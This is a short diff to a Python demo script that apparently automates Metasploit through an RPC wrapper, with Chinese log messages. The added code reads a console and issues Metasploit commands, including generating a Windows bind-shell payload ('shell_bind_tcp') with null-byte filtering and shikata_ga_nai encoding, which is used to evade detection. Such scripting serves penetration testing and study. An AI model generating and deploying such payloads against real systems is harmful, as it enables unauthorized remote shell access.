@@ -63,7 +63,22 @@ def demo3():
     msf.log.info(f"命令输出结果：{result}")
 
 
+def demo4():
+    console_id = 32
+    result = msf.call(console.read, console_id)
+    msf.log.info(f"命令输出结果：{result}")
+
+
 if __name__ == '__main__':
     # base_use()
     # demo2()
-    demo3()
+    # demo3()
+    # demo4()
+    # msf.log.info(msf.run_cmd("show exploits"))
+    # msf.log.info(msf.run_cmd("search samba"))
+
+    cmds = [
+        "use payload/windows/shell_bind_tcp",
+        "generate -b '\x00' -e x86/shikata_ga_nai"
+    ]
+    msf.log.info(msf.run_cmd(cmds))
